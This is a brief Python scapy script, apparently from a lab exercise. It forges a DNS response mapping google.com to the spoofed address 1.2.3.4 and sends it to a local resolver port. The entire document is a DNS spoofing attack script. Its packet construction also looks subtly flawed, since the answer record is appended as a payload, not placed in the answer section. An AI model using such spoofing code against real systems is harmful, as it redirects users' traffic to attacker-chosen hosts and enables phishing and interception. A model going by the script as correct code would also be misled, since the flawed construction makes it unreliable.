#!/usr/bin/env python3
from scapy.all import DNSQR,DNSRR,DNS,IP,send,UDP

# Set the DNS query and the spoofed IP address
dns_query = 'google.com'
spoofed_ip = '1.2.3.4'

# Create the DNS response packet
dns_resp = IP(dst='127.0.0.1')/UDP(dport=53)/DNS(id=0xAAAA, qr=1, aa=1, qd=DNSQR(qname=dns_query))/DNSRR(rrname=dns_query, type=1, rclass=1, ttl=3600, rdata=spoofed_ip)

# Send the DNS response packet
send(dns_resp)